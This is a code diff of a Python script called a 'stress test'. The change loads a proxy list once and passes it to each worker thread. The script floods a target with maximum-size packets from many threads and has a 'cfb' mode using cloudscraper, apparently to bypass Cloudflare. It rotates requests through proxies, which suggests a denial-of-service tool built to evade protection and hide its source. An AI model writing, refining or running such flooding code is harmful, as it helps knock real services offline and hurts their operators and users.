@@ -137,16 +137,18 @@ packet_size = 65507 if method == "udp" else 65535
 packet_counter = 0
 packet_counter_lock = threading.Lock()
 
-def stress_test(thread_id):
+def get_proxy_pool():
+    with open("proxies.txt") as proxy_file:
+        proxy_list = proxy_file.read().strip().split("\n")
+    return proxy_list
+
+def stress_test(thread_id, proxy_list):
     global packet_counter
 
     if method == "cfb":
         client = cloudscraper.create_scraper()
     else:
         if use_proxies == "y":
-            with open("proxies.txt") as proxy_file:
-                proxy_list = proxy_file.read().strip().split("\n")
-
             proxy_address = proxy_list[thread_id % len(proxy_list)]
             proxy = {"http://": f"http://{proxy_address}", "https://": f"https://{proxy_address}"}
             client = httpx.Client(proxies=proxy)
@@ -216,9 +218,11 @@ def send_packet(client):
     except Exception as e:
         pass
 
+proxy_pool = get_proxy_pool()
+
 threads = []
 for i in range(num_threads):
-    thread = threading.Thread(target=stress_test, args=(i,))
+    thread = threading.Thread(target=stress_test, args=(i, proxy_pool))
     thread.start()
     threads.append(thread)
 
@@ -226,6 +230,3 @@ for thread in threads:
     thread.join()
 
 print(Fore.YELLOW + "Stress test ended." + Style.RESET_ALL)
-
-if __name__ == "__main__":
-    pass
